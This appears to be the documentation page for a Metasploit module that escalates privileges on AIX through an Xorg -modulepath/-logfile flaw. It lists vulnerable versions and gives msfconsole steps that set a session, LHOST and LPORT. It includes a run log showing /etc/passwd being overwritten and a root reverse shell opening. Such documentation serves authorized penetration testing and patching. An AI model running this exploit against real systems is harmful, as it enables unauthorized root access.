{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/aix/local/xorg_x11_server","result":{"data":{"moduleMetadataJson":{"id":"3ffe8155-e818-5b25-9377-97ea30656883","name":"Xorg X11 Server Local Privilege Escalation","fullname":"exploit/aix/local/xorg_x11_server","description":"WARNING: Successful execution of this module results in /etc/passwd being overwritten.\n\n        This module is a port of the OpenBSD X11 Xorg exploit to run on AIX.\n\n        A permission check flaw exists for -modulepath and -logfile options when\n        starting Xorg.  This allows unprivileged users that can start the server\n        the ability to elevate privileges and run arbitrary code under root\n        privileges.\n\n        This module has been tested with AIX 7.1 and 7.2, and should also work with 6.1.\n        Due to permission restrictions of the crontab in AIX, this module does not use cron,\n        and instead overwrites /etc/passwd in order to create a new user with root privileges.\n        All currently logged in users need to be included when /etc/passwd is overwritten,\n        else AIX will throw 'Cannot get \"LOGNAME\" variable' when attempting to change user.\n        The Xorg '-fp' parameter used in the OpenBSD exploit does not work on AIX,\n        and is replaced by '-config', in conjuction with ANSI-C quotes to inject newlines when\n        overwriting /etc/passwd.","rank":500,"fields":{"detailsSlug":"/modules/details/exploit/aix/local/xorg_x11_server","documentationSlug":"/modules/documentation/exploit/aix/local/xorg_x11_server","referencesSlug":"/modules/references/exploit/aix/local/xorg_x11_server"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module is a port of the OpenBSD X11 Xorg exploit to run on AIX. A permission check flaw exists for -modulepath and -logfile options when starting Xorg. This allows unprivileged users that can start the server the ability to elevate privileges and run arbitrary code under root privileges. This module has been tested with AIX 7.1 and 7.2, and should also work with 6.1. Due to permission restrictions of the crontab in AIX, this module does not use cron, and instead overwrites /etc/passwd in order to create a new user with root privileges. All currently logged in users need to be included when /etc/passwd is overwritten, else AIX will throw 'Cannot get \"LOGNAME\" variable' when attempting to change user. The Xorg '-fp' parameter used in the OpenBSD exploit does not work on AIX, and is replaced by '-config', in conjuction with ANSI-C quotes to inject newlines when overwriting /etc/passwd.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module has been tested successfully on:</p>\n<ul>\n<li>AIX 7.1 with Xorg 7.2.3.0</li>\n<li>AIX 7.2 with Xorg 7.2.3.0</li>\n</ul>\n<p>This table lists all vulnerable Xorg versions:</p>\n<table>\n<thead>\n<tr>\n<th>Lower Level</th>\n<th>Upper Level</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>6.1.9.0</td>\n<td>6.1.9.100</td>\n</tr>\n<tr>\n<td>7.1.4.0</td>\n<td>7.1.4.30</td>\n</tr>\n<tr>\n<td>7.1.5.0</td>\n<td>7.1.5.31</td>\n</tr>\n<tr>\n<td>7.2.0.0</td>\n<td>7.2.0.1</td>\n</tr>\n<tr>\n<td>7.2.1.0</td>\n<td>7.2.1.0</td>\n</tr>\n<tr>\n<td>7.2.2.0</td>\n<td>7.2.2.0</td>\n</tr>\n<tr>\n<td>7.2.3.0</td>\n<td>7.2.3.15</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li><code class=\"language-text\">msfconsole</code></li>\n<li>Get a session</li>\n<li><code class=\"language-text\">use exploit/aix/local/xorg_x11_server</code></li>\n<li><code class=\"language-text\">set session &lt;session&gt;</code></li>\n<li><code class=\"language-text\">set LHOST &lt;lhost&gt;</code></li>\n<li><code class=\"language-text\">set LPORT &lt;lport&gt;</code></li>\n<li><code class=\"language-text\">set writabledir &lt;writabledir&gt;</code></li>\n<li><code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>SESSION</strong></p>\n<p>Which session to use, which can be viewed with <code class=\"language-text\">sessions</code></p>\n<p><strong>WritableDir</strong></p>\n<p>A writable directory file system path. (default: <code class=\"language-text\">/tmp</code>)</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p><a href=\"https://vimeo.com/372193921\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://vimeo.com/372193921</a></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(aix/local/xorg_x11_server) &gt; set session 1\nsession =&gt; 1\nmsf5 exploit(aix/local/xorg_x11_server) &gt; set writabledir /tmp\nwritabledir =&gt; /tmp\nmsf5 exploit(aix/local/xorg_x11_server) &gt; run\n\n[*] Started reverse TCP handler on 0.0.0.0:8888\n[*] Xorg version is 7.2.3.0\n[*] Retrieving currently logged in users\n[*] Writing to /tmp/wow.ksh\n[*] Backing up /etc/passwd to /tmp/passwd.backup\n[*] Executing /tmp/wow.ksh\n[*] Checking if we are root\n[+] Got root!\n[*] Writing to /tmp/wowee.ksh\n[*] Executing shell payload\n[*] Restoring original /etc/passwd\n[*] Command shell session 2 opened (172.17.0.2:8888 -&gt; 172.17.0.1:32948) at 2019-02-11 15:42:56 +0000\n[+] Deleted /tmp/wow.ksh\n[+] Deleted /tmp/passwd.backup\n[+] Deleted /tmp/wowee.ksh\n\nid\nuid=0(root) gid=0(system)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"3ffe8155-e818-5b25-9377-97ea30656883"}}}